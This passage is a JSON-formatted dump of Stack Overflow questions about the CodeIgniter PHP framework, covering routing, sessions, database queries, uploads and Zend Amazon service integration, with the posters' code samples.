$this-&gt;load-&gt;view('main/index', $data);\n    }\n}\n?&gt;\n</code></pre>\n\n<p>main/index view</p>\n\n<pre><code>&lt;?php $this-&gt;load-&gt;view('partial/header'); ?&gt;\n&lt;?php $this-&gt;load-&gt;view('components/calendar/mon_to_wed'); ?&gt;\n&lt;?php $this-&gt;load-&gt;view('partial/footer'); ?&gt;\n</code></pre>\n\n<p>components/calendar/mon_to_wed</p>\n\n<p>(Has access to $todays_events, why is this?)</p>\n\n<pre><code>&lt;div id=\"calendar_today\"&gt;\n    &lt;h1&gt;Whats Happening&lt;/h1&gt;\n    &lt;?php foreach($todays_events as $event) : ?&gt;\n        &lt;?php var_dump($event); ?&gt;\n    &lt;?php endforeach; ?&gt;\n&lt;/div&gt;\n</code></pre>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12979642,"title":"Getting rid of index.php in codeigniter with Vhost","body":"<p>I've tried every possible htaccess snippet I could find about this but none will work. My codeigniter projects is found on ci.mydomain.com and I've configured the virtualhost this way</p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n    ServerName ci.mydomain.com\n    ServerAlias ci.mydomain.com\n    ServerAdmin x@gmail.com\n    DocumentRoot /var/www/codeigniter\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>I've also set </p>\n\n<pre><code>$config['index_page'] = '';\n</code></pre>\n\n<p>I just get 404. What's wrong?\nI'm using the latest version 2.1.3</p>\n\n<p><strong>Update</strong></p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n    RewriteEngine on\n    RewriteCond $1 !^(index\\.php|images|robots\\.txt)\n    RewriteRule ^(.*)$ /index.php/$1 [PT]\n    ServerName ci.domain.com\n    ServerAlias ci.domain.com\n    ServerAdmin d@d.com\n    DocumentRoot /var/www/codeigniter\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>I tried this and it worked for me. Although I would rather use a .htaccess file.</p>\n\n<p>Edit: Guys, the reason I mentioned that I use virtual host is that i suspect that is what causes the problem. But maybe I'm wrong.</p>\n"},{"tags":["php","mysql","database","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":702,"score":0,"question_id":6927940,"title":"MYSQL ERROR 1096 - NO TABLES USED - CODEIGNITER","body":"<p>I am using a custom query as the Active Record equivelant did not work for me.</p>\n\n<p>When placing the Query in my Database Software SQLYOG it works fine however in CodeIgniter it says </p>\n\n<blockquote>\n  <p>A Database Error Occurred</p>\n  \n  <p>Error Number: 1096</p>\n  \n  <p>No tables used</p>\n  \n  <p>SELECT *</p>\n  \n  <p>Filename: C:\\xampp\\htdocs\\midas\\system\\database\\DB_driver.php</p>\n  \n  <p>Line Number: 330</p>\n</blockquote>\n\n<p>Here is my Query:</p>\n\n<pre><code>SELECT intervention.department_id, department_name, COUNT(*)\nFROM intervention \nLEFT JOIN department ON department.department_id = intervention.department_id\n\nGROUP BY intervention.department_id, department.department_name\nORDER BY COUNT(*) desc\nLIMIT 1\n</code></pre>\n\n<p>It is a bit of a strange problem.</p>\n\n<p>Here is my Schema also:</p>\n\n<p><a href=\"http://i.imgur.com/mKNtc.png\" rel=\"nofollow\">http://i.imgur.com/mKNtc.png</a></p>\n"},{"tags":["php","codeigniter","session"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12961751,"title":"Codeigniter Session->userdata is null","body":"<p>My project has several views which draw values out of the session->userdata array.\nthe whole project works flawlessly on my development machine, but when I copied the project up to a server, I find that $this->session->userdata is null.</p>\n\n<p>This is the code which inserts some values into the session->userdata array:\nIt is called in the Controller.</p>\n\n<pre><code>    $sessionArray = array(\n            'web_id' =&gt; $id,\n            'paperId' =&gt; $paperId,\n            'prelimId' =&gt; $prelimId,\n            'intakeId' =&gt; $intakeId,\n            'finalId' =&gt; $finalId,\n     );\n\n     $this-&gt;session-&gt;set_userdata($sessionArray);\n</code></pre>\n\n<p>In the view file I call</p>\n\n<pre><code>var_dump($this-&gt;session-&gt;userdata);\n</code></pre>\n\n<p>The value returned is null.  As I mentioned before, the array is NOT null on my development computer (running WAMP). Does anyone know why?</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12981351,"title":"Codeigniter AND OR AND","body":"<p>It is posible to do: (condition 1 AND condition2) OR (condition3 AND condition4) in codigniter?</p>\n\n<p>I try:</p>\n\n<pre><code>$this-&gt;db-&gt;where(condition1 - condition2);\n$this-&gt;db-&gt;or_where(condition3 - condition4);\n</code></pre>\n\n<p>But this is: (condition1 AND condition2) OR (condition3 OR condition4)</p>\n"},{"tags":["php","sql","database","query","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12979722,"title":"The word Array is displayed instead of the database entry","body":"<p>I am trying to print selected product names from my database, however all i see is the word \"Array\" instead of the product name. It is displayed as many times as the number products it finds, and that number is correct, but it only shows \"Array\"...</p>\n\n<p>Here's my code:</p>\n\n<pre><code>public function lookup($product)\n    {\n\n        $camera = $this-&gt;db-&gt;query(\"SELECT name FROM products WHERE type = 'Camera' \");\n\n        $laptop = $this-&gt;db-&gt;query(\"SELECT name FROM products WHERE type = 'Laptop' \");\n\n\n        $data = array();\n\n        switch($product)\n        {\n            case 'camera' : \n            foreach ($camera-&gt;result() as $row)\n            {\n                $entry = array();\n                $entry['name'] = $row-&gt;name;\n                $data[] = $entry;\n            }\n            return $data; break;\n\n            case 'laptop' :\n            foreach ($laptop-&gt;result() as $row)\n            {\n                $entry = array();\n                $entry['name'] = $row-&gt;name;\n                $data[] = $entry;\n            }\n            return $data; break;\n\n        }   \n    }\n</code></pre>\n"},{"tags":["php","class","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12978121,"title":"I am creating a new library to codeignighter, seem i cannot use/load helper i've created","body":"<p>basically i have a helper file with several function.\nI auto load the helper in the config file so theoretically reloading it is not required.</p>\n\n<p>However when i try to use the function that i created(from this helper) within a new library that i am working on it will through this error:</p>\n\n<pre><code>\"Parse error: syntax error, unexpected '(', expecting ',' or ';' in /home/techwork/public_html/giverhub/application/libraries/Udetails.php on line 7\"\n</code></pre>\n\n<p>Whenever i use that function anywhere else(module,controller,views) it works fine.</p>\n\n<p>I then read and thought maybe i should try loading the helper after following instructions at:\n<a href=\"http://codeigniter.com/user_guide/general/creating_libraries.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/general/creating_libraries.html</a></p>\n\n<p>and try referencing and loading but that also through an error:</p>\n\n<pre><code>\"Parse error: syntax error, unexpected T_VARIABLE, expecting T_FUNCTION in /home/techwork/public_html/giverhub/application/libraries/Udetails.php on line 5\"\n</code></pre>\n\n<p>Here is the library:</p>\n\n<pre><code>class Udetails{\n\n$CI =&amp; get_instance();// referencing as described in their website\n$CI-&gt;load-&gt;helper('mylogin_helper');// loading the helper\npublic $member_session = is_member(); // using the function \npublic $username = $member_session['username'];\npublic $current_uID = $member_session['id'];\npublic $member_status = $member_session['status'];\n}\n</code></pre>\n\n<p>Here is the function within the helper:</p>\n\n<pre><code>if ( ! function_exists('is_member'))\n{\n    function is_member(){\n        $CI =&amp; get_instance();\n    $is_logged_in = $CI-&gt;session-&gt;userdata('is_logged_in');\n    $username = $CI-&gt;session-&gt;userdata('username');\n    $capabilities = $CI-&gt;session-&gt;userdata('capabilities');\n    $user_id = $CI-&gt;session-&gt;userdata('id');\n    switch ($capabilities){\n        case 'registered':\n          $level = 1;\n          break;\n        case 'confirmed':\n          $level = 2;\n          break;\n        case 'charity_admin':\n          $level = 3;\n          break;\n        case 'admin':\n          $level = 4;\n          break;\n        case 'super_admin':\n          $level = 5;\n          break;\n        default:\n          $level = 0;\n    }\n\n    $userdetails = array();\n    if(isset($is_logged_in) &amp;&amp; $is_logged_in == true){\n        if($level &gt; 1){\n            $userdetails['username'] = $username;\n            $userdetails['status'] = TRUE;\n            $userdetails['id'] = $user_id;\n            return $userdetails;\n        }\n\n    }   \n\n}   \n}\n</code></pre>\n\n<p>Thanks in advanced.</p>\n"},{"tags":["php","javascript","html","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12978927,"title":"Using javascript to assign a php variable","body":"<p>I purchased modalbox plugin from envato market place made in javascript i want to use it to implement my categories> subcategories> items. Anyhow i know JavaScript variable can be assigned a value using php however i need the opposite.</p>\n\n<p>On my first step i let the user pick a category using basic links then onclick even takes them to second slide where i want to display the subcategories and items related to this category that was selected.</p>\n\n<p>I tried two things:</p>\n\n<pre><code>1) setting onClick = \"step2();&lt;?php $chosen_cat = ' . $this-&gt;db-&gt;escape(trim($category)) . '?&gt;\"\n</code></pre>\n\n<p>Hoping i can simply assign the name of the selected category to a value and then just use $chosen_cat in step2() javascript method to display products however this breaks the javascript as there is a conflict in output;</p>\n\n<blockquote>\n  <p>2) I changed step2() to step2(category) and then used,\n  onclick=\"step2(db->escape($category););\"  this passes the\n  value to the step2() method however now i would need to call  &lt;-- I would need to print out\n  that string to php however i have no idea how to solve this\n  considering PHP -> JS is viable as its server to client relation but\n  back..</p>\n</blockquote>\n\n<p>The $this->db->escape() is a <a href=\"http://codeigniter.com/user_guide/database/queries.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/database/queries.html</a> codeigniter method.</p>\n\n<p>My code:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n\n        function step1() {\n            modalbox.show(new Element(\"div\").insert(\n                new Element(\"p\", { \"align\": \"justify\" }).insert(\n                    &lt;?php \n                        $categories = $items;\n                        $chosen_cat = '';\n                    ?&gt;\n                    &lt;?php \n                        $i = 0;\n                        foreach($categories as $category =&gt; $itemarray) {\n                            $i++;\n                            if($i==27){\n                                echo  $this-&gt;db-&gt;escape('&lt;a class=\"category\" onclick=\"step2();&lt;?php $chosen_cat = ' . $this-&gt;db-&gt;escape(trim($category)) . '?&gt;\" href=\"#\"&gt;'. trim($category) . '&lt;/a&gt;');\n                            }\n                            else {\n                                echo $this-&gt;db-&gt;escape('&lt;a class=\"category\" onclick=\"step2();\" href=\"#\"&gt;' . trim($category) . '&lt;/a&gt;')  . '+';\n                            }\n                        }\n                    ?&gt;\n                )\n            ), {\n                \"title\"     : \"Step 1/3\",\n                \"width\"     : 800,\n                \"options\"   : [{\n                    \"label\"     : \"Next »\",\n                    \"onClick\"   : step2\n                }]\n            });\n        };\n\n        function step2() {\n            alert(&lt;?php $this-&gt;db-&gt;escape($chosen_cat); ?&gt;);\n            modalbox.show([ new Element(\"div\").insert(\n                new Element(\"p\", { \"align\": \"justify\" }).insert(\n                    \"If you open a modalbox when another one is opened, it will stretch to the new \" +\n                    \"modalbox width and height and overwrite the content.&lt;br /\\&gt;&lt;br /\\&gt;\" +\n                    \"You can use HTML or Prototype Elements like a DIV or a TABLE.\"\n                )\n            ),\n                new Element(\"p\", { \"align\": \"justify\" }).insert(\n                    \"You can have multiple contents on a single modalbox by using an array like this:&lt;br /\\&gt;&lt;br /\\&gt;\" +\n                    \"&lt;pre&gt;modalbox.show([ content1, content2, ... ], options);&lt;/pre&gt;\"\n                )\n            ], {\n                \"title\"     : \"Step 2/3\",\n                \"width\"     : 800,\n                \"options\"   : [{\n                    \"label\"     : \"« Previous\",\n                    \"onClick\"   : step1\n                }, {\n                    \"label\"     : \"Next »\",\n                    \"onClick\"   : step3\n                }]\n            }); \n        };\n        function step3() {\n            modalbox.show([ new Element(\"div\").insert(\n                new Element(\"p\", { \"align\": \"justify\" }).insert(\n                    \"If you open a modalbox when another one is opened, it will stretch to the new \" +\n                    \"modalbox width and height and overwrite the content.&lt;br /\\&gt;&lt;br /\\&gt;\" +\n                    \"You can use HTML or Prototype Elements like a DIV or a TABLE.\"\n                )\n            ),\n                new Element(\"p\", { \"align\": \"justify\" }).insert(\n                    \"You can have multiple contents on a single modalbox by using an array like this:&lt;br /\\&gt;&lt;br /\\&gt;\" +\n                    \"&lt;pre&gt;modalbox.show([ content1, content2, ... ], options);&lt;/pre&gt;\"\n                )\n            ], {\n                \"title\"     : \"Step 3/3\",\n                \"width\"     : 800,\n                \"hideOnPageClick\": false,\n                \"options\"   : [{\n                    \"label\"     : \"« Previous\",\n                    \"onClick\"   : step2\n                }, {\n                    \"label\"     : \"Finish\",\n                    \"isDefault\" : true,\n                    \"onClick\"   : modalbox.hide\n                }]\n            });\n        };\n\n    &lt;/script&gt;\n</code></pre>\n\n<p>Would it be possible to set a session variable with JavaScript in the onclick event say $_SESSION['category'] = 'category' in js style and then read that session with php and unset it i dont think this would create much of a security problem as session would exist for prolly less than a second.</p>\n"},{"tags":["php","mysql","codeigniter","invision-power-board"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12977716,"title":"Database contains #39 instead of #039","body":"<p>-- Sytem is MySQL, PHP, Apache and the code is built around the Codeigniter Framework</p>\n\n<p>EDIT FOR CLARITY: I am not storing data, I am trying to retrieve data that was stored some years ago (badly as escaped data). In the database the name Fred' is stored as Fred&amp;#39 yet when I convert Fred' using htmlspecialcahrs it comes out as Fred&amp;#039. My question is what do I need to do to make Fred' convert to Fred&amp;#39 and any other equivalents?</p>\n\n<h2>Original Question</h2>\n\n<p>I've inherited a database from another system (Invision Power Board to be exact). The site is now custom coded using Codeigniter but is using the same member database from the old Invision Power Board site.</p>\n\n<p>I've now discovered a problem where by if a user has an apostrophe in their name e.g. \"Fred'\" codeigniter's built in html_escape function (which just uses htmlspecialchars) converts it to Fred&amp;#039</p>\n\n<p>Yet in the database the name is saved as: Fred&amp;#39 and thus the lookup fails.</p>\n\n<p>I'm not sure what Invision Power Board was doing to the string before inserting it into the database, but does anyone have any idea how I could ensure that it is converted to &amp;#39 instead of &amp;#039 ?</p>\n\n<p>Simply saying do a str_replace or change the data in the db is not useful as there are hundreds of possibilities for what could be in a users name. A quick search for users with a # in their name (presumably a special char) shows up 440 users who are currently unable to login due to this bug in our site.</p>\n\n<p>EDIT: Fixed some formatting to remove \";\" so it doesn't just display an apostrophe</p>\n"},{"tags":["php","api","codeigniter","amazon","zend-framework2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12971292,"title":"How to do ItemLookup with Zend Service Amazon?","body":"<p>I would appreciate if anyone could guide me on the correct way on doing an ItemLookup by ISBN using the Zend Amazon Service module (with Zend 2.0). </p>\n\n<p>Here is my attempt:</p>\n\n<pre><code>    $query  = new ZendService\\Amazon\\Query($appId, 'UK', $secretKey);\n    $query-&gt;Category('Books')-&gt;IdType('ISBN')-&gt;ItemID('978-0321784070')-&gt;AssociateTag($tag);\n    $result = $query-&gt;ItemLookup();\n</code></pre>\n\n<p>But I get the following errors:</p>\n\n<ul>\n<li>Missing argument 1 for ZendService\\Amazon\\Amazon::itemLookup(), called in D:\\wamp\\www\\site\\controllers\\dev.php on line 122 and defined</li>\n<li>Undefined variable: asin</li>\n</ul>\n\n<p>There is no way I can define the ASIN because the only information I will have is the ISBN.</p>\n\n<p>I have already consulted the Zend Service Amazon user guide in the zend framework website but it is outdated and doesn't demonstrate how to do an ISBN lookup. I have also looked at the demo that came with the zend amazon package but that only details how to do item searches, not lookups.</p>\n"},{"tags":["image","codeigniter","upload","photo"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4905,"score":0,"question_id":1170573,"title":"photo upload with codeigniter","body":"<p>I know there are many tutorials online, but I could not make them work :( maybe something particularly wrong with my system :/</p>\n\n<p>My Controller localpath is:\n/localhost/rl/applications/backend/controller/</p>\n\n<p>Controller:</p>\n\n<pre><code>function do_upload()\n{\n\t$config['upload_path'] = './uploads/';\n\t$config['allowed_types'] = 'gif|jpg|png';\n\t$config['max_size']\t= '100';\n\t$config['max_width']  = '1024';\n\t$config['max_height']  = '768';\n\n\t$this-&gt;load-&gt;library('upload', $config);\n\n\tif ( ! $this-&gt;upload-&gt;do_upload())\n\t{\n\t\t$error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n\t\t$this-&gt;load-&gt;view('add_image', $error);\n\t}\t\n\telse\n\t{\n\t\t$data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n\t\t$data['id'] = $this-&gt;input-&gt;post['id_work'];\n\t\t$this-&gt;load-&gt;view('add_image', $data);\n\t}\n\n}\n</code></pre>\n\n<p>My View localpath is:\n/localhost/rl/applications/backend/view/</p>\n\n<p>View:</p>\n\n<pre><code>echo form_open_multipart('do_upload');\t\n    &lt;ul class=\"frm\"&gt;\n    \t&lt;li&gt;&lt;label&gt;File: *&lt;/label&gt;&lt;input type=\"file\" name=\"userfile\" class=\"frmlmnt\" size=\"50\" /&gt;&lt;/li&gt;\t\t\n    \t&lt;li&gt;&lt;label&gt;&lt;/label&gt;&lt;input type=\"submit\" class=\"btn\" value=\"Upload\" /&gt;&lt;/li&gt;\n    &lt;/ul&gt;\n &lt;/form&gt;\n</code></pre>\n\n<p><b>Maybe I do something wrong with path</b></p>\n"},{"tags":["php","codeigniter","zend-framework","amazon","zend-framework2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":89,"score":1,"question_id":12964921,"title":"How to use Zend Service Amazon?","body":"<p>I've been doing a lot of digging around and have ended up with a huge headache and no success. I am trying to use the Zend Amazon Service (within my <strong>Codeigniter</strong> framework) to fetch information about a book using its ISBN. I  initially tried it with Zend 1.12 but I kept getting an error about missing parameter AssociateTag. I am now trying with Zend 2.0 but still getting problems.</p>\n\n<p>This is the code I am using within my controller:</p>\n\n<pre><code>    set_include_path(get_include_path() . PATH_SEPARATOR . 'site/libraries');\n    require_once 'Zend2/Loader/StandardAutoloader.php';\n    $autoloader = Zend_Loader_Autoloader::getInstance();\n    $amazon = new Zend_Service_Amazon('[apikey]', 'US', '[secretkey]');\n    $item = $amazon-&gt;itemLookup('B0000A432X');\n</code></pre>\n\n<p>I get the following error:</p>\n\n<blockquote>\n  <p>Fatal error: Class 'Zend_Loader_Autoloader' not found.</p>\n</blockquote>\n\n<p>My questions are:</p>\n\n<ul>\n<li>How to load the correct autoloader?</li>\n<li>Where do I include the associate tag in the parameters? There is no mention of it in the outdated zend user guide</li>\n<li>Zend 2.0 doesn't even seem to have the amazon service files or even the /service folder. What does this mean?</li>\n</ul>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12976634,"title":"Unable to insert data into database (PHP MVC)","body":"<p>I want to allow people to submit their contacts by entering it into a field and it would eventually send it to the database but been trying it for quite some time and cant find out whats wrong with it, if possible do let me know how to return a echo saying \"SENT\" when its in database. Redirecting to the same page, if possible , dont even need a refresh to get that SENT shown to people.</p>\n\n<p>This is my Controller</p>\n\n<pre><code>  $this-&gt;config-&gt;db_config_fetch();\n$this-&gt;load-&gt;model('skills_model');\n\n//Get Form Data    \n$this-&gt;input-&gt;post('submitsms')  ;\n//GEt phone number from field\n$type = $this-&gt;input-&gt;post('phonenumber');\n//Call model\n$this-&gt;skills_model-&gt;addsms($type);\n}\n</code></pre>\n\n<p>This is my View @ home page</p>\n\n<pre><code>    &lt;form method=\"post\" action=\"&lt;?php echo site_url(''); ?&gt;\" name=\"form\"  enctype=\"multipart/form-data\"&gt;\n  &lt;label&gt;SMS Subscription&lt;/label&gt;\n  &lt;input type=\"text\" name=\"phonenumber\" placeholder=\"Phone Number here\"&gt;      \n  &lt;button class=\"btn btn-info\" name=\"submitsms\"  type=\"submit\"&gt;Subscribe&lt;/button&gt;\n  &lt;/form&gt;\n</code></pre>\n\n<p>This is my Model</p>\n\n<pre><code>function addsms($type){\n     $this-&gt;db-&gt;set('number', $type); \n     $this-&gt;db-&gt;insert('subscribers');\n }\n</code></pre>\n\n<p>I also tried the following</p>\n\n<pre><code>function addsms($type){     \n    $sql = \"INSERT INTO 'subscribers' ('number') VALUES ($type)\";\n    $this-&gt;db-&gt;query($sql);\n    echo $this-&gt;db-&gt;affected_rows();\n }\n</code></pre>\n\n<p>You advice would be of a great help! thank you!</p>\n"},{"tags":[".htaccess","codeigniter","subfolder"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12973194,"title":"Installing codeigniter in a subfolder and point to the main site?","body":"<p>I'm trying install my codeigniter application in a sub folder: <code>http://website.com/sub_folder</code></p>\n\n<p>And I want that this site is accessible through: <code>http://website.com/</code></p>\n\n<p>I have the following info in my <code>application/config.php</code> file for the base url: <code>$config['base_url']    = 'http://website.com/sub_folder';</code></p>\n\n<p>This is my <code>.htaccess</code>: </p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|images|captcha|assets|favicon\\.gif|robots\\.txt)\nRewriteRule ^(.*)$ /sub_folder/index.php/$1 [L]\n</code></pre>\n\n<p>The problem is that when I change the <code>$config['base_url']</code> to access my asset files, like css etc al my other links using <code>$base_url()</code> point to : <code>http://website.com/sub_folder</code> too instead of <code>http://website.com/</code></p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12973242,"title":"Codeigniter routing subsections to get parameters","body":"<p>I have URLs in format <code>userrolesubmenu/mycontroller/mymethod/1</code>\nAnd I want it to be rewritten to <code>mycontroller/mymethod/1?user_role=userrolesubmenu</code></p>\n\n<p>The problem is that CodeIgniter (v.1.7.2 to be precise) doesn't seem to like routing like that. Even if I add</p>\n\n<pre><code>$config['permitted_uri_chars'] = 'a-z 0-9~%.:_-?=';\n</code></pre>\n\n<p>to configuration, which I think will not change parsing to include GET params at all</p>\n\n<p>So is it possible to do rewrites with GET params like that at all AND have normal GET params being merged too? So that <code>userrolesubmenu/mycontroller/mymethod/1?page=3</code> would be merged to <code>?page=3&amp;user_role=userrolesubmenu</code></p>\n\n<p>So far I'm using apache's mod_rewrite for these cases</p>\n\n<pre><code>RewriteRule ^userrolesubmenu/mycontroller/(.+) index.php/mycontroller/$1?user_role=userrolesubmenu [L]\n</code></pre>\n\n<p>But I'd like to minimize rewrite dependencies to have it in one place.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":55,"score":2,"question_id":12971586,"title":"session not working in other controller in CI","body":"<p>I set session in login() controller where login user details is set in session. session library is autoload .</p>\n\n<pre><code>$data = $this-&gt;login_model-&gt;login_admin();\n\n$this-&gt;session-&gt;set_userdata('UserLoggedInDetails',$data); //set login user details\n</code></pre>\n\n<p>when we do \n<code>var_dump($this-&gt;session-&gt;userdata('UserLoggedInDetails'));</code>//it prints all login user details in same controller</p>\n\n<p>but when we do it in other controller or in same controller in other function-</p>\n\n<pre><code>var_dump($this-&gt;session-&gt;userdata('UserLoggedInDetails'));\n</code></pre>\n\n<p>it prints <code>array(0) { }</code></p>\n\n<p>my config file is-</p>\n\n<pre><code>$config['sess_cookie_name'] = 'ci_session';\n$config['sess_expiration']  = 7200;\n$config['sess_expire_on_close'] = FALSE;\n$config['sess_encrypt_cookie']  = FALSE;\n$config['sess_use_database']    = FALSE;\n$config['sess_table_name']  = 'ci_sessions';\n$config['sess_match_ip']    = FALSE;\n$config['sess_match_useragent'] = TRUE;\n$config['sess_time_to_update']  = 300;\n</code></pre>\n\n<p>I search all previous asked question like this but not solve this issue ...Please Help Me out .. \nAll Suggestion are welcome . Thanks In Advance. </p>\n"},{"tags":["php","codeigniter","zend-studio"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12972679,"title":"CodeIgniter auto complete in Zend Studio 9.0.2","body":"<p>Been trying to get Zend Studio to auto complete CodeIgniter.\nStumbled upon <a href=\"http://stackoverflow.com/questions/1080068/how-to-get-zend-studio-autocomplete-with-codeigniter\">this stackoverflow answer</a> though with no luck. I have added system/libraries to the PHP Include Path, though when I open a controller and try to get auto complete to work ($this->db) nothing appears.</p>\n\n<p>I've searched google for quiet a bit and the only answer I could find was the one I attached.</p>\n\n<p>If someone tried that before, maybe he could show me where I'm mistaken, Thanks in advance.</p>\n"},{"tags":["php","facebook","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":43,"score":-1,"question_id":12907881,"title":"Fatal error: Uncaught OAuthException: The session is invalid because the user logged out. thrown in libraries\\facebook.php","body":"<p>I am geting this error after when i am signing out from login through my codeigniter application</p>\n\n<pre><code>$e = new FacebookApiException($result);\n\n      switch ($e-&gt;getType()) {\n        // OAuth 2.0 Draft 00 style\n        case 'OAuthException':\n        // OAuth 2.0 Draft 10 style\n        case 'invalid_token':\n          $this-&gt;setSession(null);\n      }\n      throw $e;\n    }\n    return $result;\n  }\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":85,"score":-1,"question_id":3061592,"title":"I Need to integrate Surveys (any) with Codeigniter. Any one have any ideas or suggestion?","body":"<p>I Need to integrate Surveys (any) with Codeigniter. Any one have any ideas or suggestion? </p>\n"},{"tags":["php","mysql","codeigniter","database-connection"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12970432,"title":"Codeigniter - multiple db users for multiple db connections and use [SOLVED]","body":"<p>i'm using 2 different databases on my CI app.</p>\n\n<p>I created 2 users on mysql, and granted user1 to db1 all privileges, then user2 to db2 all privileges with SQLpro client.</p>\n\n<p>The database.php:</p>\n\n<pre><code>$active_group = 'default';\n$active_record = TRUE;\n\n\n    $db['default']['hostname'] = 'localhost';\n    $db['default']['username'] = '***1';\n    $db['default']['password'] = '***1';\n    $db['default']['database'] = 'ci_users';\n    $db['default']['dbdriver'] = 'mysql';\n    $db['default']['dbprefix'] = '';\n    $db['default']['pconnect'] = TRUE;\n    $db['default']['db_debug'] = TRUE;\n    $db['default']['cache_on'] = FALSE;\n    $db['default']['cachedir'] = '';\n    $db['default']['char_set'] = 'utf8';\n    $db['default']['dbcollat'] = 'utf8_unicode_ci';\n    $db['default']['swap_pre'] = '';\n    $db['default']['autoinit'] = TRUE;\n    $db['default']['stricton'] = FALSE;\n\n    $db['keys']['hostname'] = 'localhost';\n    $db['keys']['username'] = '***2';\n    $db['keys']['password'] = '***2';\n    $db['keys']['database'] = 'ci_keys';\n    $db['keys']['dbdriver'] = 'mysql';\n    $db['keys']['dbprefix'] = '';\n    $db['keys']['pconnect'] = TRUE;\n    $db['keys']['db_debug'] = TRUE;\n    $db['keys']['cache_on'] = FALSE;\n    $db['keys']['cachedir'] = '';\n    $db['keys']['char_set'] = 'utf8';\n    $db['keys']['dbcollat'] = 'utf8_unicode_ci';\n    $db['keys']['swap_pre'] = '';\n    $db['keys']['autoinit'] = TRUE;\n    $db['keys']['stricton'] = FALSE;\n</code></pre>\n\n<p>The models:</p>\n\n<pre><code>&lt;?php\n\nif ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Model_Users extends CI_Model {\n    function Model_Users()\n    {\n        // Call the Model constructor\n        parent::__construct();\n        $this-&gt;load-&gt;database('default',true);\n    }\netc...\n\n\n&lt;?php\n\nif ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Model_Keys extends CI_Model {\n    function Model_Keys()\n    {\n        // Call the Model constructor\n        parent::__construct();\n        $this-&gt;load-&gt;database('keys',true);\n    }\netc...\n</code></pre>\n\n<p>So when using both models in same controller/method the model_users works great but model_keys returns error, cause seems it loads anyway the model_users db1 instead ofl oading db2:</p>\n\n<pre><code>A PHP Error was encountered\n\nSeverity: Warning\n\nMessage: Cannot modify header information - headers already sent by (output started at /Applications/XAMPP/xamppfiles/htdocs/app/application/models/model_keys.php:2)\n\nFilename: core/Common.php\n\nLine Number: 442\nA Database Error Occurred\n\nError Number: 1146\n\nTable 'ci_users.ci_keys' doesn't exist //this should be ci_keys.ci_keys\n</code></pre>\n\n<p>does anyone has idea?</p>\n\n<p>I edited code in model_keys:</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Model_Keys extends CI_Model {\n\n    function Model_Keys()\n    {\n        // Call the Model constructor\n        parent::__construct();\n        $this-&gt;db_keys = $this-&gt;load-&gt;database('keys',true);\n    } \n</code></pre>\n\n<p>now db works but i receive session error on model :O</p>\n\n<pre><code>Message: Cannot modify header information - headers already sent by (output started at /Applications/XAMPP/xamppfiles/htdocs/loggetz/application/models/model_keys.php:2)\n</code></pre>\n\n<p>in controller i'm doing this:</p>\n\n<pre><code>$this-&gt;load-&gt;model('model_users');\n$this-&gt;model_users-&gt;insert(bla bla);\n\n$this-&gt;load-&gt;model('model_keys');\n$this-&gt;model_keys-&gt;insert(bla bla);\n\n$this-&gt;session-&gt;set_userdata(array(bl bla);\n\nredirect(some url);\n</code></pre>\n"},{"tags":["mysql","sql","codeigniter","random"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12970386,"title":"Codeigniter random row mysql error- Object of class CI_DB_mysqli_result could not be converted to string","body":"<pre><code>function random()\n    {\n    $anketadb = $this-&gt;load-&gt;database('anketa',TRUE);\n    $br = $anketadb-&gt;count_all_results('anketadata');\n    $nmb = mt_rand(1,$br);\n\n    if ($nmb != 1){\n    $nmb = $nmb - 1;\n    }\n\n    $count = $anketadb-&gt;get('anketadata', 1, $nmb);\n\n    return $count;\n    